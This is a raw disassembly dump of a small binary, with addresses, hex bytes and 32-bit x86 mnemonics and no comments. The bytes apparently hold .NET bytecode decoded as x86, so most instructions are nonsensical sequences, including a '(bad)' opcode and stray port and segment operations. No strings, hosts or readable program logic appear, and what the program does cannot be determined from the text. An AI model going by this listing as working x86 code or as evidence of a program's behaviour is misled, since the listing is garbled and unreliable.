  4025a1:	00 00                	add    %al,(%eax)
  4025a3:	11 02                	adc    %eax,(%edx)
  4025a5:	28 27                	sub    %ah,(%edi)
  4025a7:	00 00                	add    %al,(%eax)
  4025a9:	0a 2d 08 03 28 27    	or     0x27280308,%ch
  4025af:	00 00                	add    %al,(%eax)
  4025b1:	0a 2c 05 dd 8b 01 00 	or     0x18bdd(,%eax,1),%ch
  4025b8:	00 03                	add    %al,(%ebx)
  4025ba:	28 28                	sub    %ch,(%eax)
  4025bc:	00 00                	add    %al,(%eax)
  4025be:	0a 10                	or     (%eax),%dl
  4025c0:	01 28                	add    %ebp,(%eax)
  4025c2:	03 00                	add    (%eax),%eax
  4025c4:	00 06                	add    %al,(%esi)
  4025c6:	39 b4 00 00 00 72 01 	cmp    %esi,0x1720000(%eax,%eax,1)
  4025cd:	00 00                	add    %al,(%eax)
  4025cf:	70 73                	jo     0x402644
  4025d1:	29 00                	sub    %eax,(%eax)
  4025d3:	00 0a                	add    %cl,(%edx)
  4025d5:	0a 06                	or     (%esi),%al
  4025d7:	1b 8d 57 00 00 01    	sbb    0x1000057(%ebp),%ecx
  4025dd:	25 16 72 13 00       	and    $0x137216,%eax
  4025e2:	00 70 a2             	add    %dh,-0x5e(%eax)
  4025e5:	25 17 02 a2 25       	and    $0x25a20217,%eax
  4025ea:	18 72 2f             	sbb    %dh,0x2f(%edx)
  4025ed:	00 00                	add    %al,(%eax)
  4025ef:	70 a2                	jo     0x402593
  4025f1:	25 19 03 a2 25       	and    $0x25a20319,%eax
  4025f6:	1a 72 5b             	sbb    0x5b(%edx),%dh
  4025f9:	00 00                	add    %al,(%eax)
  4025fb:	70 a2                	jo     0x40259f
  4025fd:	28 2a                	sub    %ch,(%edx)
  4025ff:	00 00                	add    %al,(%eax)
  402601:	0a 6f 2b             	or     0x2b(%edi),%ch
  402604:	00 00                	add    %al,(%eax)
  402606:	0a 06                	or     (%esi),%al
  402608:	16                   	push   %ss
  402609:	6f                   	outsl  %ds:(%esi),(%dx)
  40260a:	2c 00                	sub    $0x0,%al
  40260c:	00 0a                	add    %cl,(%edx)
  40260e:	06                   	push   %es
  40260f:	17                   	pop    %ss
  402610:	6f                   	outsl  %ds:(%esi),(%dx)
  402611:	2d 00 00 0a 06       	sub    $0x60a0000,%eax
  402616:	17                   	pop    %ss
  402617:	6f                   	outsl  %ds:(%esi),(%dx)
  402618:	2e 00 00             	add    %al,%cs:(%eax)
  40261b:	0a 06                	or     (%esi),%al
  40261d:	17                   	pop    %ss
  40261e:	6f                   	outsl  %ds:(%esi),(%dx)
  40261f:	2f                   	das
  402620:	00 00                	add    %al,(%eax)
  402622:	0a 06                	or     (%esi),%al
  402624:	28 30                	sub    %dh,(%eax)
  402626:	00 00                	add    %al,(%eax)
  402628:	0a 0b                	or     (%ebx),%cl
  40262a:	07                   	pop    %es
  40262b:	6f                   	outsl  %ds:(%esi),(%dx)
  40262c:	31 00                	xor    %eax,(%eax)
  40262e:	00 0a                	add    %cl,(%edx)
  402630:	07                   	pop    %es
  402631:	6f                   	outsl  %ds:(%esi),(%dx)
  402632:	32 00                	xor    (%eax),%al
  402634:	00 0a                	add    %cl,(%edx)
  402636:	2d 3b 73 33 00       	sub    $0x33733b,%eax
  40263b:	00 0a                	add    %cl,(%edx)
  40263d:	0c 08                	or     $0x8,%al
  40263f:	72 81                	jb     0x4025c2
  402641:	00 00                	add    %al,(%eax)
  402643:	70 72                	jo     0x4026b7
  402645:	8f 00                	pop    (%eax)
  402647:	00 70 6f             	add    %dh,0x6f(%eax)
  40264a:	34 00                	xor    $0x0,%al
  40264c:	00 0a                	add    %cl,(%edx)
  40264e:	08 72 9f             	or     %dh,-0x61(%edx)
  402651:	00 00                	add    %al,(%eax)
  402653:	70 72                	jo     0x4026c7
  402655:	af                   	scas   %es:(%edi),%eax
  402656:	00 00                	add    %al,(%eax)
  402658:	70 6f                	jo     0x4026c9
  40265a:	34 00                	xor    $0x0,%al
  40265c:	00 0a                	add    %cl,(%edx)
  40265e:	7e 01                	jle    0x402661
  402660:	00 00                	add    %al,(%eax)
  402662:	04 08                	add    $0x8,%al
  402664:	6f                   	outsl  %ds:(%esi),(%dx)
  402665:	35 00 00 0a 6f       	xor    $0x6f0a0000,%eax
  40266a:	4f                   	dec    %edi
  40266b:	00 00                	add    %al,(%eax)
  40266d:	06                   	push   %es
  40266e:	dd d1                	fst    %st(1)
  402670:	00 00                	add    %al,(%eax)
  402672:	00 de                	add    %bl,%dh
  402674:	0a 07                	or     (%edi),%al
  402676:	2c 06                	sub    $0x6,%al
  402678:	07                   	pop    %es
  402679:	6f                   	outsl  %ds:(%esi),(%dx)
  40267a:	26 00 00             	add    %al,%es:(%eax)
  40267d:	0a dc                	or     %ah,%bl
  40267f:	7e 36                	jle    0x4026b7
  402681:	00 00                	add    %al,(%eax)
  402683:	0a 72 15             	or     0x15(%edx),%dh
  402686:	01 00                	add    %eax,(%eax)
  402688:	70 17                	jo     0x4026a1
  40268a:	6f                   	outsl  %ds:(%esi),(%dx)
  40268b:	37                   	aaa
  40268c:	00 00                	add    %al,(%eax)
  40268e:	0a 0d 09 2c 52 09    	or     0x9522c09,%cl
  402694:	02 72 71             	add    0x71(%edx),%dh
  402697:	01 00                	add    %eax,(%eax)
  402699:	70 03                	jo     0x40269e
  40269b:	72 71                	jb     0x40270e
  40269d:	01 00                	add    %eax,(%eax)
  40269f:	70 28                	jo     0x4026c9
  4026a1:	38 00                	cmp    %al,(%eax)
  4026a3:	00 0a                	add    %cl,(%edx)
  4026a5:	17                   	pop    %ss
  4026a6:	6f                   	outsl  %ds:(%esi),(%dx)
  4026a7:	39 00                	cmp    %eax,(%eax)
  4026a9:	00 0a                	add    %cl,(%edx)
  4026ab:	73 33                	jae    0x4026e0
  4026ad:	00 00                	add    %al,(%eax)
  4026af:	0a 13                	or     (%ebx),%dl
  4026b1:	04 11                	add    $0x11,%al
  4026b3:	04 72                	add    $0x72,%al
  4026b5:	81 00 00 70 72 8f    	addl   $0x8f727000,(%eax)
  4026bb:	00 00                	add    %al,(%eax)
  4026bd:	70 6f                	jo     0x40272e
  4026bf:	34 00                	xor    $0x0,%al
  4026c1:	00 0a                	add    %cl,(%edx)
  4026c3:	11 04 72             	adc    %eax,(%edx,%esi,2)
  4026c6:	9f                   	lahf
  4026c7:	00 00                	add    %al,(%eax)
  4026c9:	70 72                	jo     0x40273d
  4026cb:	75 01                	jne    0x4026ce
  4026cd:	00 70 6f             	add    %dh,0x6f(%eax)
  4026d0:	34 00                	xor    $0x0,%al
  4026d2:	00 0a                	add    %cl,(%edx)
  4026d4:	7e 01                	jle    0x4026d7
  4026d6:	00 00                	add    %al,(%eax)
  4026d8:	04 11                	add    $0x11,%al
  4026da:	04 6f                	add    $0x6f,%al
  4026dc:	35 00 00 0a 6f       	xor    $0x6f0a0000,%eax
  4026e1:	4f                   	dec    %edi
  4026e2:	00 00                	add    %al,(%eax)
  4026e4:	06                   	push   %es
  4026e5:	de 0a                	fimuls (%edx)
  4026e7:	09 2c 06             	or     %ebp,(%esi,%eax,1)
  4026ea:	09 6f 26             	or     %ebp,0x26(%edi)
  4026ed:	00 00                	add    %al,(%eax)
  4026ef:	0a dc                	or     %ah,%bl
  4026f1:	de 51 13             	ficoms 0x13(%ecx)
  4026f4:	05 73 33 00 00       	add    $0x3373,%eax
  4026f9:	0a 13                	or     (%ebx),%dl
  4026fb:	06                   	push   %es
  4026fc:	11 06                	adc    %eax,(%esi)
  4026fe:	72 81                	jb     0x402681
  402700:	00 00                	add    %al,(%eax)
  402702:	70 72                	jo     0x402776
  402704:	c5 01                	lds    (%ecx),%eax
  402706:	00 70 6f             	add    %dh,0x6f(%eax)
  402709:	34 00                	xor    $0x0,%al
  40270b:	00 0a                	add    %cl,(%edx)
  40270d:	11 06                	adc    %eax,(%esi)
  40270f:	72 c5                	jb     0x4026d6
  402711:	01 00                	add    %eax,(%eax)
  402713:	70 72                	jo     0x402787
  402715:	d1 01                	roll   $1,(%ecx)
  402717:	00 70 11             	add    %dh,0x11(%eax)
  40271a:	05 25 2d 04 26       	add    $0x26042d25,%eax
  40271f:	14 2b                	adc    $0x2b,%al
  402721:	05 6f 3a 00 00       	add    $0x3a6f,%eax
  402726:	0a 28                	or     (%eax),%ch
  402728:	3b 00                	cmp    (%eax),%eax
  40272a:	00 0a                	add    %cl,(%edx)
  40272c:	6f                   	outsl  %ds:(%esi),(%dx)
  40272d:	34 00                	xor    $0x0,%al
  40272f:	00 0a                	add    %cl,(%edx)
  402731:	7e 01                	jle    0x402734
  402733:	00 00                	add    %al,(%eax)
  402735:	04 11                	add    $0x11,%al
  402737:	06                   	push   %es
  402738:	6f                   	outsl  %ds:(%esi),(%dx)
  402739:	35 00 00 0a 6f       	xor    $0x6f0a0000,%eax
  40273e:	4f                   	dec    %edi
  40273f:	00 00                	add    %al,(%eax)
  402741:	06                   	push   %es
  402742:	de 00                	fiadds (%eax)
  402744:	2a 00                	sub    (%eax),%al
  402746:	00 00                	add    %al,(%eax)
  402748:	41                   	inc    %ecx
  402749:	4c                   	dec    %esp
  40274a:	00 00                	add    %al,(%eax)
  40274c:	02 00                	add    (%eax),%al
  40274e:	00 00                	add    %al,(%eax)
  402750:	86 00                	xchg   %al,(%eax)
  402752:	00 00                	add    %al,(%eax)
  402754:	4b                   	dec    %ebx
  402755:	00 00                	add    %al,(%eax)
  402757:	00 d1                	add    %dl,%cl
  402759:	00 00                	add    %al,(%eax)
  40275b:	00 0a                	add    %cl,(%edx)
  40275d:	00 00                	add    %al,(%eax)
  40275f:	00 00                	add    %al,(%eax)
  402761:	00 00                	add    %al,(%eax)
  402763:	00 02                	add    %al,(%edx)
  402765:	00 00                	add    %al,(%eax)
  402767:	00 ec                	add    %ch,%ah
  402769:	00 00                	add    %al,(%eax)
  40276b:	00 57 00             	add    %dl,0x0(%edi)
  40276e:	00 00                	add    %al,(%eax)
  402770:	43                   	inc    %ebx
  402771:	01 00                	add    %eax,(%eax)
  402773:	00 0a                	add    %cl,(%edx)
	...
  402781:	00 00                	add    %al,(%eax)
  402783:	00 4f 01             	add    %cl,0x1(%edi)
  402786:	00 00                	add    %al,(%eax)
  402788:	4f                   	dec    %edi
  402789:	01 00                	add    %eax,(%eax)
  40278b:	00 51 00             	add    %dl,0x0(%ecx)
  40278e:	00 00                	add    %al,(%eax)
  402790:	56                   	push   %esi
  402791:	00 00                	add    %al,(%eax)
  402793:	01 13                	add    %edx,(%ebx)
  402795:	30 02                	xor    %al,(%edx)
  402797:	00 2f                	add    %ch,(%edi)
  402799:	00 00                	add    %al,(%eax)
  40279b:	00 03                	add    %al,(%ebx)
  40279d:	00 00                	add    %al,(%eax)
  40279f:	11 12                	adc    %edx,(%edx)
  4027a1:	00 28                	add    %ch,(%eax)
  4027a3:	3d 00 00 0a 7d       	cmp    $0x7d0a0000,%eax
  4027a8:	06                   	push   %es
  4027a9:	00 00                	add    %al,(%eax)
  4027ab:	04 12                	add    $0x12,%al
  4027ad:	00 15 7d 05 00 00    	add    %dl,0x57d
  4027b3:	04 12                	add    $0x12,%al
  4027b5:	00 7c 06 00          	add    %bh,0x0(%esi,%eax,1)
  4027b9:	00 04 12             	add    %al,(%edx,%edx,1)
  4027bc:	00 28                	add    %ch,(%eax)
  4027be:	01 00                	add    %eax,(%eax)
  4027c0:	00 2b                	add    %ch,(%ebx)
  4027c2:	12 00                	adc    (%eax),%al
  4027c4:	7c 06                	jl     0x4027cc
  4027c6:	00 00                	add    %al,(%eax)
  4027c8:	04 28                	add    $0x28,%al
  4027ca:	3f                   	aas
  4027cb:	00 00                	add    %al,(%eax)
  4027cd:	0a 2a                	or     (%edx),%ch
  4027cf:	00 1b                	add    %bl,(%ebx)
  4027d1:	30 03                	xor    %al,(%ebx)
  4027d3:	00 b1 00 00 00 04    	add    %dh,0x4000000(%ecx)
  4027d9:	00 00                	add    %al,(%eax)
  4027db:	11 02                	adc    %eax,(%edx)
  4027dd:	7b 05                	jnp    0x4027e4
  4027df:	00 00                	add    %al,(%eax)
  4027e1:	04 0a                	add    $0xa,%al
  4027e3:	06                   	push   %es
  4027e4:	2c 39                	sub    $0x39,%al
  4027e6:	20 88 13 00 00 28    	and    %cl,0x28000013(%eax)
  4027ec:	40                   	inc    %eax
  4027ed:	00 00                	add    %al,(%eax)
  4027ef:	0a 6f 41             	or     0x41(%edi),%ch
  4027f2:	00 00                	add    %al,(%eax)
  4027f4:	0a 0b                	or     (%ebx),%cl
  4027f6:	12 01                	adc    (%ecx),%al
  4027f8:	28 42 00             	sub    %al,0x0(%edx)
  4027fb:	00 0a                	add    %cl,(%edx)
  4027fd:	2d 3c 02 16 25       	sub    $0x2516023c,%eax
  402802:	0a 7d 05             	or     0x5(%ebp),%bh
  402805:	00 00                	add    %al,(%eax)
  402807:	04 02                	add    $0x2,%al
  402809:	07                   	pop    %es
  40280a:	7d 07                	jge    0x402813
  40280c:	00 00                	add    %al,(%eax)
  40280e:	04 02                	add    $0x2,%al
  402810:	7c 06                	jl     0x402818
  402812:	00 00                	add    %al,(%eax)
  402814:	04 12                	add    $0x12,%al
  402816:	01 02                	add    %eax,(%edx)
  402818:	28 02                	sub    %al,(%edx)
  40281a:	00 00                	add    %al,(%eax)
  40281c:	2b de                	sub    %esi,%ebx
  40281e:	6d                   	insl   (%dx),%es:(%edi)
  40281f:	02 7b 07             	add    0x7(%ebx),%bh
  402822:	00 00                	add    %al,(%eax)
  402824:	04 0b                	add    $0xb,%al
  402826:	02 7c 07 00          	add    0x0(%edi,%eax,1),%bh
  40282a:	00 04 fe             	add    %al,(%esi,%edi,8)
  40282d:	15 09 00 00 01       	adc    $0x1000009,%eax
  402832:	02 15 25 0a 7d 05    	add    0x57d0a25,%dl
  402838:	00 00                	add    %al,(%eax)
  40283a:	04 12                	add    $0x12,%al
  40283c:	01 28                	add    %ebp,(%eax)
  40283e:	44                   	inc    %esp
  40283f:	00 00                	add    %al,(%eax)
  402841:	0a 7e 26             	or     0x26(%esi),%bh
  402844:	00 00                	add    %al,(%eax)
  402846:	04 2c                	add    $0x2c,%al
  402848:	17                   	pop    %ss
  402849:	28 45 00             	sub    %al,0x0(%ebp)
  40284c:	00 0a                	add    %cl,(%edx)
  40284e:	6f                   	outsl  %ds:(%esi),(%dx)
  40284f:	46                   	inc    %esi
  402850:	00 00                	add    %al,(%eax)
  402852:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  402855:	28 47 00             	sub    %al,0x0(%edi)
  402858:	00 0a                	add    %cl,(%edx)
  40285a:	08 28                	or     %ch,(%eax)
  40285c:	04 00                	add    $0x0,%al
  40285e:	00 06                	add    %al,(%esi)
  402860:	de 17                	ficoms (%edi)
  402862:	0d 02 1f fe 7d       	or     $0x7dfe1f02,%eax
  402867:	05 00 00 04 02       	add    $0x2040000,%eax
  40286c:	7c 06                	jl     0x402874
  40286e:	00 00                	add    %al,(%eax)
  402870:	04 09                	add    $0x9,%al
  402872:	28 48 00             	sub    %cl,0x0(%eax)
  402875:	00 0a                	add    %cl,(%edx)
  402877:	de 13                	ficoms (%ebx)
  402879:	02 1f                	add    (%edi),%bl
  40287b:	fe                   	(bad)
  40287c:	7d 05                	jge    0x402883
  40287e:	00 00                	add    %al,(%eax)
  402880:	04 02                	add    $0x2,%al
  402882:	7c 06                	jl     0x40288a
  402884:	00 00                	add    %al,(%eax)
  402886:	04 28                	add    $0x28,%al
  402888:	49                   	dec    %ecx
  402889:	00 00                	add    %al,(%eax)
  40288b:	0a 2a                	or     (%edx),%ch
  40288d:	00 00                	add    %al,(%eax)
  40288f:	00 01                	add    %al,(%ecx)
  402891:	10 00                	adc    %al,(%eax)
  402893:	00 00                	add    %al,(%eax)
  402895:	00 07                	add    %al,(%edi)
  402897:	00 7f 86             	add    %bh,-0x7a(%edi)
  40289a:	00 17                	add    %dl,(%edi)
  40289c:	56                   	push   %esi
  40289d:	00 00                	add    %al,(%eax)
  40289f:	01 13                	add    %edx,(%ebx)
  4028a1:	30 02                	xor    %al,(%edx)
  4028a3:	00 16                	add    %dl,(%esi)
  4028a5:	01 00                	add    %eax,(%eax)
  4028a7:	00 00                	add    %al,(%eax)
  4028a9:	00 00                	add    %al,(%eax)
  4028ab:	00 02                	add    %al,(%edx)
  4028ad:	28 3c 00             	sub    %bh,(%eax,%eax,1)
  4028b0:	00 0a                	add    %cl,(%edx)
  4028b2:	02 03                	add    (%ebx),%al
  4028b4:	7d 08                	jge    0x4028be
  4028b6:	00 00                	add    %al,(%eax)
  4028b8:	04 02                	add    $0x2,%al
  4028ba:	7e 22                	jle    0x4028de
  4028bc:	00 00                	add    %al,(%eax)
  4028be:	04 7d                	add    $0x7d,%al
  4028c0:	0a 00                	or     (%eax),%al
  4028c2:	00 04 02             	add    %al,(%edx,%eax,1)
  4028c5:	7e 23                	jle    0x4028ea
  4028c7:	00 00                	add    %al,(%eax)
  4028c9:	04 7d                	add    $0x7d,%al
  4028cb:	0b 00                	or     (%eax),%eax
  4028cd:	00 04 02             	add    %al,(%edx,%eax,1)
  4028d0:	7e 24                	jle    0x4028f6
  4028d2:	00 00                	add    %al,(%eax)
  4028d4:	04 7d                	add    $0x7d,%al
  4028d6:	0c 00                	or     $0x0,%al
  4028d8:	00 04 02             	add    %al,(%edx,%eax,1)
  4028db:	7e 25                	jle    0x402902
  4028dd:	00 00                	add    %al,(%eax)
  4028df:	04 7d                	add    $0x7d,%al
  4028e1:	0d 00 00 04 02       	or     $0x2040000,%eax
  4028e6:	7e 26                	jle    0x40290e
  4028e8:	00 00                	add    %al,(%eax)
  4028ea:	04 7d                	add    $0x7d,%al
  4028ec:	0e                   	push   %cs
  4028ed:	00 00                	add    %al,(%eax)
  4028ef:	04 02                	add    $0x2,%al
  4028f1:	7e 27                	jle    0x40291a
  4028f3:	00 00                	add    %al,(%eax)
  4028f5:	04 7d                	add    $0x7d,%al
  4028f7:	0f 00 00             	sldt   (%eax)
  4028fa:	04 02                	add    $0x2,%al
  4028fc:	7e 28                	jle    0x402926
  4028fe:	00 00                	add    %al,(%eax)
  402900:	04 7d                	add    $0x7d,%al
  402902:	10 00                	adc    %al,(%eax)
  402904:	00 04 02             	add    %al,(%edx,%eax,1)
  402907:	7e 29                	jle    0x402932
  402909:	00 00                	add    %al,(%eax)
  40290b:	04 7d                	add    $0x7d,%al
  40290d:	11 00                	adc    %eax,(%eax)
  40290f:	00 04 02             	add    %al,(%edx,%eax,1)
  402912:	7e 2a                	jle    0x40293e
  402914:	00 00                	add    %al,(%eax)
  402916:	04 7d                	add    $0x7d,%al
  402918:	12 00                	adc    (%eax),%al
  40291a:	00 04 02             	add    %al,(%edx,%eax,1)
  40291d:	7e 2b                	jle    0x40294a
  40291f:	00 00                	add    %al,(%eax)
  402921:	04 7d                	add    $0x7d,%al
  402923:	13 00                	adc    (%eax),%eax
  402925:	00 04 02             	add    %al,(%edx,%eax,1)
  402928:	7e 2c                	jle    0x402956
  40292a:	00 00                	add    %al,(%eax)
  40292c:	04 7d                	add    $0x7d,%al
  40292e:	14 00                	adc    $0x0,%al
  402930:	00 04 02             	add    %al,(%edx,%eax,1)
  402933:	7e 2d                	jle    0x402962
  402935:	00 00                	add    %al,(%eax)
  402937:	04 7d                	add    $0x7d,%al
  402939:	15 00 00 04 02       	adc    $0x2040000,%eax
  40293e:	7e 2e                	jle    0x40296e
  402940:	00 00                	add    %al,(%eax)
  402942:	04 7d                	add    $0x7d,%al
  402944:	16                   	push   %ss
  402945:	00 00                	add    %al,(%eax)
  402947:	04 02                	add    $0x2,%al
  402949:	7e 2f                	jle    0x40297a
  40294b:	00 00                	add    %al,(%eax)
  40294d:	04 7d                	add    $0x7d,%al
  40294f:	17                   	pop    %ss
  402950:	00 00                	add    %al,(%eax)
  402952:	04 02                	add    $0x2,%al
  402954:	7e 30                	jle    0x402986
  402956:	00 00                	add    %al,(%eax)
  402958:	04 7d                	add    $0x7d,%al
  40295a:	18 00                	sbb    %al,(%eax)
  40295c:	00 04 02             	add    %al,(%edx,%eax,1)
  40295f:	7e 31                	jle    0x402992
  402961:	00 00                	add    %al,(%eax)
  402963:	04 7d                	add    $0x7d,%al
  402965:	19 00                	sbb    %eax,(%eax)
  402967:	00 04 02             	add    %al,(%edx,%eax,1)
  40296a:	7e 32                	jle    0x40299e
  40296c:	00 00                	add    %al,(%eax)
  40296e:	04 7d                	add    $0x7d,%al
  402970:	1a 00                	sbb    (%eax),%al
  402972:	00 04 02             	add    %al,(%edx,%eax,1)
  402975:	7e 33                	jle    0x4029aa
  402977:	00 00                	add    %al,(%eax)
  402979:	04 7d                	add    $0x7d,%al
  40297b:	1b 00                	sbb    (%eax),%eax
  40297d:	00 04 02             	add    %al,(%edx,%eax,1)
  402980:	7e 34                	jle    0x4029b6
  402982:	00 00                	add    %al,(%eax)
  402984:	04 7d                	add    $0x7d,%al
  402986:	1c 00                	sbb    $0x0,%al
  402988:	00 04 02             	add    %al,(%edx,%eax,1)
  40298b:	7e 35                	jle    0x4029c2
  40298d:	00 00                	add    %al,(%eax)
  40298f:	04 7d                	add    $0x7d,%al
  402991:	1d 00 00 04 02       	sbb    $0x2040000,%eax
  402996:	7e 36                	jle    0x4029ce
  402998:	00 00                	add    %al,(%eax)
  40299a:	04 7d                	add    $0x7d,%al
  40299c:	1e                   	push   %ds
  40299d:	00 00                	add    %al,(%eax)
  40299f:	04 02                	add    $0x2,%al
  4029a1:	7e 37                	jle    0x4029da
  4029a3:	00 00                	add    %al,(%eax)
  4029a5:	04 7d                	add    $0x7d,%al
  4029a7:	1f                   	pop    %ds
  4029a8:	00 00                	add    %al,(%eax)
  4029aa:	04 02                	add    $0x2,%al
  4029ac:	7e 38                	jle    0x4029e6
  4029ae:	00 00                	add    %al,(%eax)
  4029b0:	04 7d                	add    $0x7d,%al
  4029b2:	20 00                	and    %al,(%eax)
  4029b4:	00 04 02             	add    %al,(%edx,%eax,1)
  4029b7:	7e 39                	jle    0x4029f2
  4029b9:	00 00                	add    %al,(%eax)
  4029bb:	04 7d                	add    $0x7d,%al
  4029bd:	21 00                	and    %eax,(%eax)
  4029bf:	00 04 2a             	add    %al,(%edx,%ebp,1)
  4029c2:	00 00                	add    %al,(%eax)
  4029c4:	13 30                	adc    (%eax),%esi
  4029c6:	01 00                	add    %eax,(%eax)
  4029c8:	25 01 00 00 00       	and    $0x1,%eax
  4029cd:	00 00                	add    %al,(%eax)
  4029cf:	00 72 05             	add    %dh,0x5(%edx)
  4029d2:	02 00                	add    (%eax),%al
  4029d4:	70 80                	jo     0x402956
  4029d6:	22 00                	and    (%eax),%al
  4029d8:	00 04 72             	add    %al,(%edx,%esi,2)
  4029db:	13 02                	adc    (%edx),%eax
  4029dd:	00 70 80             	add    %dh,-0x80(%eax)
  4029e0:	23 00                	and    (%eax),%eax
  4029e2:	00 04 72             	add    %al,(%edx,%esi,2)
  4029e5:	43                   	inc    %ebx
  4029e6:	02 00                	add    (%eax),%al
  4029e8:	70 28                	jo     0x402a12
  4029ea:	4b                   	dec    %ebx
  4029eb:	00 00                	add    %al,(%eax)
  4029ed:	0a 80 24 00 00 04    	or     0x4000024(%eax),%al
  4029f3:	72 4d                	jb     0x402a42
  4029f5:	02 00                	add    (%eax),%al
  4029f7:	70 80                	jo     0x402979
  4029f9:	25 00 00 04 72       	and    $0x72040000,%eax
  4029fe:	6b 02 00             	imul   $0x0,(%edx),%eax
  402a01:	70 28                	jo     0x402a2b
  402a03:	4c                   	dec    %esp
  402a04:	00 00                	add    %al,(%eax)
  402a06:	0a 80 26 00 00 04    	or     0x4000026(%eax),%al
  402a0c:	72 75                	jb     0x402a83
  402a0e:	02 00                	add    (%eax),%al
  402a10:	70 28                	jo     0x402a3a
  402a12:	4b                   	dec    %ebx
  402a13:	00 00                	add    %al,(%eax)
  402a15:	0a 80 27 00 00 04    	or     0x4000027(%eax),%al
  402a1b:	72 79                	jb     0x402a96
  402a1d:	02 00                	add    (%eax),%al
  402a1f:	70 28                	jo     0x402a49
  402a21:	4c                   	dec    %esp
  402a22:	00 00                	add    %al,(%eax)
  402a24:	0a 80 28 00 00 04    	or     0x4000028(%eax),%al
  402a2a:	72 79                	jb     0x402aa5
  402a2c:	02 00                	add    (%eax),%al
  402a2e:	70 28                	jo     0x402a58
  402a30:	4c                   	dec    %esp
  402a31:	00 00                	add    %al,(%eax)
  402a33:	0a 80 29 00 00 04    	or     0x4000029(%eax),%al
  402a39:	72 79                	jb     0x402ab4
  402a3b:	02 00                	add    (%eax),%al
  402a3d:	70 28                	jo     0x402a67
  402a3f:	4c                   	dec    %esp
  402a40:	00 00                	add    %al,(%eax)
  402a42:	0a 80 2a 00 00 04    	or     0x400002a(%eax),%al
  402a48:	72 85                	jb     0x4029cf
  402a4a:	02 00                	add    (%eax),%al
  402a4c:	70 80                	jo     0x4029ce
  402a4e:	2b 00                	sub    (%eax),%eax
  402a50:	00 04 72             	add    %al,(%edx,%esi,2)
  402a53:	fd                   	std
  402a54:	02 00                	add    (%eax),%al
  402a56:	70 80                	jo     0x4029d8
  402a58:	2c 00                	sub    $0x0,%al
  402a5a:	00 04 72             	add    %al,(%edx,%esi,2)
  402a5d:	79 02                	jns    0x402a61
  402a5f:	00 70 28             	add    %dh,0x28(%eax)
  402a62:	4c                   	dec    %esp
  402a63:	00 00                	add    %al,(%eax)
  402a65:	0a 80 2d 00 00 04    	or     0x400002d(%eax),%al
  402a6b:	16                   	push   %ss
  402a6c:	80 2e 00             	subb   $0x0,(%esi)
  402a6f:	00 04 72             	add    %al,(%edx,%esi,2)
  402a72:	79 02                	jns    0x402a76
  402a74:	00 70 28             	add    %dh,0x28(%eax)
  402a77:	4c                   	dec    %esp
  402a78:	00 00                	add    %al,(%eax)
  402a7a:	0a 80 2f 00 00 04    	or     0x400002f(%eax),%al
  402a80:	72 0d                	jb     0x402a8f
  402a82:	03 00                	add    (%eax),%eax
  402a84:	70 80                	jo     0x402a06
  402a86:	30 00                	xor    %al,(%eax)
  402a88:	00 04 72             	add    %al,(%edx,%esi,2)
  402a8b:	79 02                	jns    0x402a8f
  402a8d:	00 70 28             	add    %dh,0x28(%eax)
  402a90:	4c                   	dec    %esp
  402a91:	00 00                	add    %al,(%eax)
  402a93:	0a 80 31 00 00 04    	or     0x4000031(%eax),%al
  402a99:	72 3f                	jb     0x402ada
  402a9b:	03 00                	add    (%eax),%eax
  402a9d:	70 80                	jo     0x402a1f
  402a9f:	32 00                	xor    (%eax),%al
  402aa1:	00 04 72             	add    %al,(%edx,%esi,2)
  402aa4:	51                   	push   %ecx
  402aa5:	03 00                	add    (%eax),%eax
  402aa7:	70 80                	jo     0x402a29
  402aa9:	33 00                	xor    (%eax),%eax
  402aab:	00 04 72             	add    %al,(%edx,%esi,2)
  402aae:	79 02                	jns    0x402ab2
  402ab0:	00 70 28             	add    %dh,0x28(%eax)
  402ab3:	4c                   	dec    %esp
  402ab4:	00 00                	add    %al,(%eax)
  402ab6:	0a 80 34 00 00 04    	or     0x4000034(%eax),%al
  402abc:	16                   	push   %ss
  402abd:	80 35 00 00 04 72 9f 	xorb   $0x9f,0x72040000
  402ac4:	03 00                	add    (%eax),%eax
  402ac6:	70 80                	jo     0x402a48
  402ac8:	36 00 00             	add    %al,%ss:(%eax)
  402acb:	04 72                	add    $0x72,%al
  402acd:	a1 03 00 70 80       	mov    0x80700003,%eax
  402ad2:	37                   	aaa
  402ad3:	00 00                	add    %al,(%eax)
  402ad5:	04 72                	add    $0x72,%al
  402ad7:	b1 03                	mov    $0x3,%cl
  402ad9:	00 70 28             	add    %dh,0x28(%eax)
  402adc:	4b                   	dec    %ebx
  402add:	00 00                	add    %al,(%eax)
  402adf:	0a 80 38 00 00 04    	or     0x4000038(%eax),%al
  402ae5:	72 79                	jb     0x402b60
  402ae7:	02 00                	add    (%eax),%al
  402ae9:	70 28                	jo     0x402b13
  402aeb:	4c                   	dec    %esp
  402aec:	00 00                	add    %al,(%eax)
  402aee:	0a 80 39 00 00 04    	or     0x4000039(%eax),%al
  402af4:	2a 00                	sub    (%eax),%al
  402af6:	00 00                	add    %al,(%eax)
  402af8:	13 30                	adc    (%eax),%esi
  402afa:	03 00                	add    (%eax),%eax
  402afc:	54                   	push   %esp
  402afd:	00 00                	add    %al,(%eax)
  402aff:	00 00                	add    %al,(%eax)
  402b01:	00 00                	add    %al,(%eax)
  402b03:	00 02                	add    %al,(%edx)
  402b05:	73 4d                	jae    0x402b54
  402b07:	00 00                	add    %al,(%eax)
  402b09:	0a 7d 3a             	or     0x3a(%ebp),%bh
  402b0c:	00 00                	add    %al,(%eax)
  402b0e:	04 02                	add    $0x2,%al
  402b10:	73 4e                	jae    0x402b60
  402b12:	00 00                	add    %al,(%eax)
  402b14:	0a 7d 3b             	or     0x3b(%ebp),%bh
  402b17:	00 00                	add    %al,(%eax)
  402b19:	04 02                	add    $0x2,%al
  402b1b:	73 4f                	jae    0x402b6c
  402b1d:	00 00                	add    %al,(%eax)
  402b1f:	0a 7d 40             	or     0x40(%ebp),%bh
  402b22:	00 00                	add    %al,(%eax)
  402b24:	04 02                	add    $0x2,%al
  402b26:	73 50                	jae    0x402b78
  402b28:	00 00                	add    %al,(%eax)
  402b2a:	0a 7d 41             	or     0x41(%ebp),%bh
  402b2d:	00 00                	add    %al,(%eax)
  402b2f:	04 02                	add    $0x2,%al
  402b31:	73 51                	jae    0x402b84
  402b33:	00 00                	add    %al,(%eax)
  402b35:	0a 7d 42             	or     0x42(%ebp),%bh
  402b38:	00 00                	add    %al,(%eax)
  402b3a:	04 02                	add    $0x2,%al
  402b3c:	28 3c 00             	sub    %bh,(%eax,%eax,1)
  402b3f:	00 0a                	add    %cl,(%edx)
